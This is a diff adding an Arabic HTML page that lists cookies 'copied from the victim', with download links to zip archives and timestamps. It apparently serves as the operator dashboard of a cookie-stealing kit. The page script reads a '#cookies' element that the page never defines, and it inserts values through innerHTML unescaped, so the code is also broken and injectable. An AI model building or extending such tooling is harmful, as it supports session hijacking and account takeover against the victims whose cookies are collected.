@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>عرض الكوكيز</title>
+</head>
+<body>
+  <table border="1">
+    <thead>
+      <tr>
+        <th>رابط تحميل الكوكيز</th>
+        <th>وقت النسخ</th>
+      </tr>
+    </thead>
+    <tbody>
+      <!-- سيتم ملء هذا الجدول بالكوكيز التي تم نسخها من الضحية -->
+    </tbody>
+  </table>
+
+  <script>
+    // الحصول على الكوكيز من الصفحة الأولى
+    const cookies = JSON.parse(document.querySelector("#cookies").textContent);
+
+    // إضافة الكوكيز إلى الجدول
+    for (const cookie of cookies) {
+      const row = document.createElement("tr");
+      row.innerHTML = `
+        <td><a href="${cookie.zip}">تحميل</a></td>
+        <td>${cookie.time}</td>
+      `;
+      document.querySelector("tbody").appendChild(row);
+    }
+  </script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</body>
+</html>
